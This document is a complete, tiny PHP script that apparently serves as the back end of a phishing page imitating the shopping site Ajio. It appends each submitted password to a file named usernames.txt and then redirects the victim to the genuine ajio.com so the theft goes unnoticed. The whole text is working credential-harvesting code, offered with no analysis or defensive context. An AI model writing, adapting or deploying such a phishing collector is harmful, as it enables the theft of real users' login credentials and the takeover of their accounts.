<?php
file_put_contents("usernames.txt", "Password: " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.ajio.com/');
?>